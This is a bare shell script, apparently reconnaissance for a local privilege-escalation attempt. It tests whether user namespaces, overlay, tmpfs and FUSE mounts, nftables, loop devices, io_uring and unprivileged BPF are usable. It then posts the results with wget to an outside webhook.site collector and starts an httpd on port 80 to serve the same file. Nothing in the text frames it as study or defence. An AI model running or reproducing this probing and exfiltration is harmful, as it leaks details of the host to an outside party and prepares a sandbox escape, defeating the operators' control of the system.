#!/bin/sh
out=/tmp/out.txt; : > $out
echo "==MARK v2==" >> $out
echo "==userns==" >> $out; unshare -Ur id >> $out 2>&1
echo "==tmpfs==" >> $out; unshare -Urm sh -c 'mkdir -p /tmp/m; mount -t tmpfs none /tmp/m && echo TMPFS_OK || echo TMPFS_FAIL' >> $out 2>&1
echo "==overlay==" >> $out; unshare -Urm sh -c 'mkdir -p /tmp/l /tmp/u /tmp/w /tmp/o; echo x>/tmp/l/f; mount -t overlay overlay -o lowerdir=/tmp/l,upperdir=/tmp/u,workdir=/tmp/w /tmp/o && echo OVL_OK || echo OVL_FAIL' >> $out 2>&1
echo "==devfuse==" >> $out; ls -la /dev/fuse >> $out 2>&1
echo "==fusemount==" >> $out; unshare -Urm sh -c 'mkdir -p /tmp/f; mount -t fuse none /tmp/f && echo FUSE_OK || echo FUSE_FAIL' >> $out 2>&1
echo "==nft==" >> $out; unshare -Urn sh -c 'nft add table inet bbht && echo NFT_OK || echo NFT_FAIL' >> $out 2>&1
echo "==uriuring==" >> $out; cat /proc/sys/kernel/io_uring_disabled >> $out 2>&1
echo "==loop==" >> $out; ls /dev/loop* >> $out 2>&1
echo "==bpf==" >> $out; cat /proc/sys/kernel/unprivileged_bpf_disabled >> $out 2>&1
echo "DONE" >> $out
wget -q -O- --post-file=$out "https://webhook.site/1a315c42-31b4-4eab-bb1a-5860736bdeb8/lpe3"
mkdir -p /www; cp $out /www/out.txt; httpd -f -p 80 -h /www
